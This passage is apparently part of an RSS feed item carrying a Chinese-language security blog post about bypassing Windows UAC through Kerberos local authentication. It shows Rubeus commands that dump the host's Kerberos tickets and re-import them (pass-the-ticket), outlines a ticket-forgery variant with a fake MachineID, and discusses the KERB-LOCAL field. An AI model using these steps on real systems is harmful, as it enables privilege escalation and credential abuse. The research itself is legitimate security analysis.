&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;klist&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$env:COMPUTERNAME&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Rubeus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$env:COMPUTERNAME&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nowrap&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 保存Base64票据后重启&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Rubeus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ptt&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ticket&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BASE64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TICKET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;方法二票据伪造攻击&#34;&gt;方法二：票据伪造攻击
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;利用Benjamin Delpy在kekeo中发现的非约束委派漏洞获取本地TGT&lt;/li&gt;
&lt;li&gt;向KDC请求新的本地服务票据，填充伪造的MachineID&lt;/li&gt;
&lt;li&gt;将伪造票据导入缓存实现UAC绕过&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;kerb-local的奥秘&#34;&gt;KERB-LOCAL的奥秘
&lt;/h2&gt;&lt;p&gt;这个字段设计用于凭证重用，但实际使用频率很低，因为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;仅当服务端使用Negotiate包时有效&lt;/li&gt;
&lt;li&gt;本地Negotiate认证默认会选择NTLM协议&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有趣的是，KERB-LOCAL中的值实际是LSASS堆中KERB_CREDENTIAL结构的地址和票据计数。虽然Kerberos会验证PAC中的SID匹配性，但这种实现方式可能存在安全隐患。&lt;/p&gt;
&lt;p&gt;[更新] 文末提供了修改Win32 SCM API以强制使用Kerberos本地认证的C++代码示例。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
